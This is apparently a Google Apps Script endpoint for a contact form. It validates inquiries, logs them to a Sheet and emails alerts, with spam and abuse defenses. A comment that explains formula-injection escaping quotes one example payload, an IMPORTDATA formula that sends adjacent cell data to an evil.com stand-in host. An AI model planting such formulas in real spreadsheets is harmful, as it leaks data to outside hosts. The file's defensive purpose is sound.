/**
 * IP Inquiry form endpoint.
 * Receives POSTs from the static landing page, appends to a Sheet, emails a notification.
 *
 * SETUP: see SETUP.md — you must set NOTIFY_EMAIL below before deploying.
 */

const NOTIFY_EMAIL  = 'carlos.colon@ask.com';  // where inquiry alerts go
const SHEET_NAME    = 'Inquiries';

// Abuse controls. The /exec endpoint is public — anyone can POST to it directly,
// bypassing the form and its honeypot. These cap the blast radius.
const MAX_EMAILS_PER_HOUR = 15;    // beyond this, still log but stop emailing
const MAX_FIELD_LEN       = 200;   // reject absurd inputs before they bloat the sheet
const MAX_MESSAGE_LEN     = 5000;
const MIN_MESSAGE_LEN     = 20;    // "asdf" is not an eight-figure inquiry
const MAX_LINKS           = 3;     // link-stuffed messages are near-always spam

/**
 * Cloudflare Turnstile — OFF until you paste a secret key here.
 * Empty string = disabled, and every check below no-ops. That's the intended
 * default: don't pay for insurance until the tripwire fires (see SETUP.md).
 *
 * To enable: paste the secret, then paste the matching SITEKEY in contact-form.html.
 * Both must be set — one without the other fails closed.
 *
 * This is server-side and never reaches the browser, so a constant is safe here.
 * If you'd rather keep it out of the source entirely, use:
 *   PropertiesService.getScriptProperties().getProperty('TURNSTILE_SECRET')
 */
const TURNSTILE_SECRET = '';

function doPost(e) {
  try {
    const p = e.parameter || {};

    // Honeypot. Stops bots that render the form. Won't stop a direct POST —
    // that's what the checks below are for.
    if (p.company_website) {
      return json({ ok: true });
    }

    // Turnstile. No-ops while TURNSTILE_SECRET is empty.
    if (!verifyTurnstile_(p['cf-turnstile-response'])) {
      return json({ ok: false, error: 'Verification failed. Please try again.' });
    }

    // Server-side validation — never trust the client.
    const firstName = String(p.first_name || '').trim();
    const lastName  = String(p.last_name  || '').trim();
    const email     = String(p.email      || '').trim();
    const message   = String(p.message    || '').trim();

    if (!firstName || !lastName || !email || !message) {
      return json({ ok: false, error: 'Missing required fields.' });
    }
    if (!validName_(firstName) || !validName_(lastName)) {
      return json({ ok: false, error: 'Please enter your name.' });
    }
    if (!validEmail_(email)) {
      return json({ ok: false, error: 'Invalid email address.' });
    }
    if (firstName.length > MAX_FIELD_LEN || lastName.length > MAX_FIELD_LEN ||
        email.length > MAX_FIELD_LEN || message.length > MAX_MESSAGE_LEN) {
      return json({ ok: false, error: 'Input too long.' });
    }
    // Real error, not silent: a legitimate buyer who typed one line should be
    // told to write more, not quietly dropped.
    if (message.length < MIN_MESSAGE_LEN) {
      return json({ ok: false, error: 'Please tell us a little more about your inquiry.' });
    }

    // Link-stuffing heuristic. Real buyers rarely paste 4+ URLs.
    const links = (message.match(/https?:\/\//gi) || []).length;
    if (links > MAX_LINKS) {
      return json({ ok: true });   // accept silently; don't teach the bot
    }

    const phone = String(p.phone || '').trim();
    if (!validPhone_(phone)) {
      return json({ ok: false, error: 'Please enter a valid phone number, or leave it blank.' });
    }

    // Throttle email, not logging. A flood fills the sheet (cheap — delete the rows)
    // rather than burying your inbox or burning the daily send quota.
    const canEmail = underEmailLimit_();

    const sheet = getSheet_();
    sheet.appendRow([
      new Date(),
      safeCell_(firstName),
      safeCell_(lastName),
      safeCell_(email),
      safeCell_(phone),
      safeCell_(message),
      canEmail ? 'New' : 'New (not emailed — throttled)'
    ]);

    if (canEmail) {
      notify_({ firstName, lastName, email, phone, message });
    }

    return json({ ok: true });

  } catch (err) {
    console.error(err);
    return json({ ok: false, error: 'Server error.' });
  }
}

/**
 * Phone validation — STRUCTURAL, not format-based.
 *
 * Deliberately does not enforce a country's format. "+44 (0)20 7946 0958",
 * "415-555-0172", and "+81-3-1234-5678" are all valid and look nothing alike;
 * a format regex would reject real buyers, which costs far more than a junk
 * string in an optional column.
 *
 * What it does enforce:
 *   - letters are not phone numbers  ("not-a-phone!!!" dies here)
 *   - digit count within E.164 range (max 15 digits; 7 is a sane floor)
 *   - only real formatting characters, one optional leading +
 *   - an optional extension suffix (x123, ext. 4567, #89)
 *
 * Empty passes — the field is optional.
 * Known trade-off: vanity numbers (1-800-FLOWERS) are rejected. Acceptable.
 */
function validPhone_(raw) {
  const s = String(raw || '').trim();
  if (!s) return true;               // optional
  if (s.length > 32) return false;   // nothing legitimate is this long

  // Peel off an extension before counting digits, so it can't inflate the total.
  const core = s.replace(/\s*(?:x|ext\.?|extension|#)\s*\d{1,6}\s*$/i, '').trim();

  // Digits and formatting only, at most one leading +.
  if (!/^\+?[\d\s\-().]+$/.test(core)) return false;

  const digits = core.replace(/\D/g, '');
  return digits.length >= 7 && digits.length <= 15;
}

/**
 * Name validation — must contain at least one letter (any script).
 *
 * Catches "####", "12345", "...". Does NOT reject O'Brien, Smith-Jones, José,
 * or 李 — \p{L} is Unicode-aware, so non-Latin names pass. This is the check
 * people get wrong by reaching for /^[A-Za-z]+$/ and locking out half the world.
 */
function validName_(raw) {
  const s = String(raw || '').trim();
  return s.length >= 1 && /\p{L}/u.test(s);
}

/**
 * Email validation — syntactic only.
 *
 * Cannot tell you the mailbox exists; only that the string could be an address.
 * Tighter than the usual one-liner: requires a real TLD (kills "j@corp") and
 * rejects consecutive or edge dots.
 */
function validEmail_(raw) {
  const s = String(raw || '').trim();
  if (!/^[A-Za-z0-9._%+\-]+@[A-Za-z0-9\-]+(?:\.[A-Za-z0-9\-]+)*\.[A-Za-z]{2,63}$/.test(s)) return false;
  if (s.indexOf('..') !== -1) return false;
  const local = s.split('@')[0];
  if (local.charAt(0) === '.' || local.charAt(local.length - 1) === '.') return false;
  return true;
}

/**
 * Neutralizes spreadsheet formula injection.
 *
 * appendRow writes a leading =, +, -, or @ as a LIVE FORMULA, not text. A name
 * field containing =IMPORTDATA("https://evil.com/?x="&A2) would fire an outbound
 * request the moment you open the sheet, leaking adjacent cells. Same trick works
 * with =HYPERLINK to phish anyone you share the sheet with.
 *
 * Prefixing with an apostrophe forces Sheets to treat the value as text. The
 * apostrophe is a formatting marker — it does NOT appear in the cell, and copying
 * the value out gives you the original string.
 *
 * Deliberately NOT a character blocklist: names legitimately contain apostrophes
 * (O'Brien), hyphens (Smith-Jones), and accents (José). Stripping "special
 * characters" from names rejects real buyers — the classic version of this bug.
 */
function safeCell_(value) {
  const s = String(value == null ? '' : value);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/**
 * Verifies a Turnstile token against Cloudflare's siteverify endpoint.
 * Returns true (pass-through) when TURNSTILE_SECRET is empty, so the form keeps
 * working while the feature is off.
 *
 * Fails CLOSED on a bad token but OPEN if Cloudflare itself is unreachable —
 * a Cloudflare outage should not silently eat your inbound IP inquiries. That's
 * the right trade at this stake level; flip it if you ever disagree.
 */
function verifyTurnstile_(token) {
  if (!TURNSTILE_SECRET) return true;      // disabled
  if (!token) return false;                // enabled but no token = not from our form

  try {
    const res = UrlFetchApp.fetch(
      'https://challenges.cloudflare.com/turnstile/v0/siteverify',
      {
        method: 'post',
        payload: { secret: TURNSTILE_SECRET, response: token },
        muteHttpExceptions: true
      }
    );

    const data = JSON.parse(res.getContentText());
    if (!data.success) {
      console.warn('Turnstile rejected: ' + JSON.stringify(data['error-codes'] || []));
    }
    return data.success === true;

  } catch (err) {
    console.error('Turnstile unreachable, allowing through: ' + err);
    return true;                           // fail open — don't lose real leads
  }
}

/**
 * Rolling hourly email cap. Apps Script can't see the client IP, so this is a
 * global limit rather than per-sender — blunt, but it protects the inbox and
 * the Gmail send quota. Nothing is ever dropped; throttled items still hit the sheet.
 */
function underEmailLimit_() {
  const cache = CacheService.getScriptCache();
  const key   = 'sent_' + Math.floor(Date.now() / 3600000);  // bucket per hour
  const count = Number(cache.get(key) || 0);

  if (count >= MAX_EMAILS_PER_HOUR) return false;

  cache.put(key, String(count + 1), 3700);
  return true;
}

/** Returns the target sheet, creating it with headers on first run. */
function getSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(SHEET_NAME);

  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow([
      'Timestamp', 'First Name', 'Last Name', 'Email', 'Phone', 'Message', 'Status'
    ]);
    sheet.getRange('A1:G1').setFontWeight('bold');
    sheet.setFrozenRows(1);
  }
  return sheet;
}

/** Emails the inquiry so you can act without opening the sheet. */
function notify_(d) {
  const fullName = d.firstName + ' ' + d.lastName;
  const subject  = `Ask.com inquiry — ${fullName}`;

  const body = [
    `Name:   ${fullName}`,
    `Email:  ${d.email}`,
    `Phone:  ${d.phone || '—'}`,
    '',
    'Message:',
    d.message,
    '',
    '—',
    `Logged: ${SpreadsheetApp.getActiveSpreadsheet().getUrl()}`
  ].join('\n');

  MailApp.sendEmail({
    to: NOTIFY_EMAIL,
    subject: subject,
    body: body,
    replyTo: d.email      // hit Reply and it goes straight to the buyer
  });
}

function json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
